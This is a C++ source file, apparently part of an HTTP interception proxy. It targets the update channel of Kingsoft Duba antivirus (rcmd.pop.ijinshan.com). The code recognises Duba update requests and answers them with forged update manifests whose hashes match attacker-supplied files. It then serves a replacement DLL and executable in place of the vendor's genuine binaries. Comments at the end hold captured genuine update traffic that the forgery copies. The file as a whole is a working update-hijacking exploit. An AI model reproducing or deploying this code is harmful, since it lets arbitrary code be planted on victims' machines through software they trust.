#include "Duba.h"
#include "../HttpUtils.h"
#include "../FileOper.h"
#include "../cipher/CryptoUtils.h"
#include "PluginServer.h"


int gDubaFlag = 0;

int DuBa::isDuba(const char * url, const char * host) {
	if (strstr(host, "rcmd.pop.ijinshan.com"))
	{
		if (strstr(url, "/krcmdinst/") && strstr(url, "/updatebin.xml") ) {
			gDubaFlag = 1;
			return TRUE;
		}
		else if (strstr(url,"/updatefile.xml"))
		{
			gDubaFlag = 2;
			return TRUE;
		}else if ( (strstr(url,"/krcmdinst/") && strstr(url,"/krcmdtool.dll")) ||
			(strstr(url, "/krcmdinst/") && strstr(url, "/krcmddown.dll")) ||
			(strstr(url, "/krcmdinst/") && strstr(url, "/krcmdmon.dll")) )
		{
			gDubaFlag = 3;
			return TRUE;
		}else if ( strstr(url, "/krcmdinst/") && strstr(url, "/kdownloader.exe") )
		{
			gDubaFlag = 4;
			return TRUE;
		}
	}
	return FALSE;
}


int DuBa::replyDuba(char * dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = FALSE;

	if (gDubaFlag == 3)
	{
		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
			"Connection: keep-alive\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Content-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "DownloadHelper.dll");
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
		return 0;
	}else if (gDubaFlag == 4)
	{
		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
			"Connection: keep-alive\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Content-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
		return 0;
	}

	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string dllsrcfn = Public::getUserPluginPath(lphttp->username) + "DownloadHelper.dll";
	string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;

	char szmd5_1[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(exesrcfn, szmd5_1, hexmd5, FALSE);
	if (filesize1 <= 0)
	{
		return FALSE;
	}

	char szmd5_2[64] = { 0 };
	int filesize2 = CryptoUtils::getUpdateFileMd5(dllsrcfn, szmd5_2, hexmd5, FALSE);
	if (filesize2 <= 0)
	{
		return FALSE;
	}

	char * retformat = 0;

	int retlen = 0;
	char result[4096];
	if (gDubaFlag == 1)
	{
		retformat =
			"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
			"<root>\r\n"
			"\t<bin>\r\n"
			"\t\t<item name=\"krcmdtool.dll\" path=\"\\\" hash=\"%s\"/>\r\n"
			"\t\t<item name=\"krcmddown.dll\" path=\"\\\" hash=\"%s\"/>\r\n"
			"\t\t<item name=\"kdownloader.exe\" path=\"\\\" hash=\"%s\"/>\r\n"
			"\t\t<item name=\"krcmdmon.dll\" path=\"\\\" hash=\"%s\"/>\r\n"
			"\t</bin>\r\n"
			"</root>\r\n";

		retlen = sprintf(result, retformat, szmd5_2, szmd5_2, szmd5_1, szmd5_2);
	}else if (gDubaFlag == 2)
	{
		retformat =
			"<?xml version=\"1.0\" encoding=\"utf-8\" ?>\r\n"
			"<root>\r\n"
			"\t<cfg>\r\n"
			"\t\t<!--item name=\"recommendctrl.config\" path=\"\\\" hash=\"ab1db5e419854fd914144956e9297797\" /-->\r\n"
			"\t\t<!--item name=\"krcmddb.dat\" path=\"\\\" hash=\"%s\" /-->\r\n"
			"\t\t<!--item name=\"safeurl.dat\" path=\"\\\" hash=\"%s\" /-->\r\n"
			"\t</cfg>\r\n"
			"</root>";
		retlen = sprintf(result, retformat, szmd5_2, szmd5_2);
	}

	int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

	return responseLen;
}


/*
GET /defend/o1/dbtgcf.ini HTTP/1.1
Host: 2398.35go.net
Accept: *//*
User-Agent: Mozilla/4.0

HTTP/1.1 200 OK
Date: Tue, 04 Jun 2019 10:57:23 GMT
Content-Type: application/octet-stream
Content-Length: 307
Connection: keep-alive
Server: Tengine
Last-Modified: Wed, 19 Aug 2015 08:07:12 GMT
ETag: "55d43930-133"
Accept-Ranges: bytes
X-Ser: BC155_dx-lt-shandong-qingdao-2-cache-2, BC90_dx-zhejiang-jinhua-4-cache-4
X-Cache: HIT from BC90_dx-zhejiang-jinhua-4-cache-4(baishan)

[pmr_install]
Type=2
Data=http://dlied6.qq.com/invc/xfspeed/qqpcmgr/download/qqpcmgr_v10.3.15564.218_70439_Silence.exe
Version=2
SupplyId=0
Retry=0

[msc_install]
Type=2
Data=http://dldir1.qq.com/music/clntupate/QQMusicDownloader.exe
Cmd=-name jinshan -channelid 10
Version=1
SupplyId=0
Retry=0
*/

/*
GET /krcmdinst/1335/updatebin.xml HTTP/1.1
Host: rcmd.pop.ijinshan.com
Content-Type: application/octet-stream
User-Agent: Mozilla/4.0
Accept: *//*
Connection: close

HTTP/1.1 200 OK
Server: openresty
Date: Thu, 26 Sep 2019 08:26:28 GMT
Content-Type: text/xml
Content-Length: 404
Connection: close
Last-Modified: Mon, 06 May 2019 10:08:12 GMT
ETag: "5cd0078c-194"
Expires: Tue, 03 Sep 2019 10:42:21 GMT
Cache-Control: max-age=1800
X-Cache: HIT from sal-tln-sdjn-p1-52-148
X-Cache: HIT from sal-ctc-jsyc-n-93-196
Accept-Ranges: bytes

<?xml version="1.0" encoding="utf-8" ?>
<root>
.<bin>
..<item name="krcmdtool.dll" path="\" hash="4DEA7C6FAD2414A53BD3690ED5D8E68F" />
..<item name="krcmddown.dll" path="\" hash="63360A028BF1D86EA9D2C1672AC589B8" />
..<item name="kdownloader.exe" path="\" hash="E47270B06B8CB246D0D246AAFA4BB7F2" />
..<item name="krcmdmon.dll" path="\" hash="24F59F1F237405E05379D3A78495D0AB" />
.</bin>
</root>
*/

/*
rcmd.pop.ijinshan.com/krcmdtool.dll

rcmd.pop.ijinshan.com/krcmddb.dat
GET /1335/updatefile.xml HTTP/1.1
Host: rcmd.pop.ijinshan.com
Content-Type: application/octet-stream
User-Agent: Mozilla/4.0
Accept: *//*
Connection: close

HTTP/1.1 200 OK
Server: openresty
Date: Tue, 18 Jun 2019 01:28:08 GMT
Content-Type: text/xml
Content-Length: 339
Connection: close
Last-Modified: Mon, 03 Nov 2014 04:03:41 GMT
ETag: "5456fe9d-153"
Expires: Thu, 13 Jun 2019 16:35:37 GMT
Cache-Control: max-age=1800
X-Cache: HIT from sal-tln-jsnt-p1-124-83
X-Cache: HIT from sal-ctc-zjtz-n-21-34
Accept-Ranges: bytes

<?xml version="1.0" encoding="utf-8" ?>
<root>
.<cfg>
..<!--item name="recommendctrl.config" path="\" hash="ab1db5e419854fd914144956e9297797" /-->
..<!--item name="krcmddb.dat" path="\" hash="58c41ff01614882f060ac66cf6902358" /-->
..<!--item name="safeurl.dat" path="\" hash="1d2089bee5c6125704a60977eb733486" /-->
.</cfg>
</root>
*/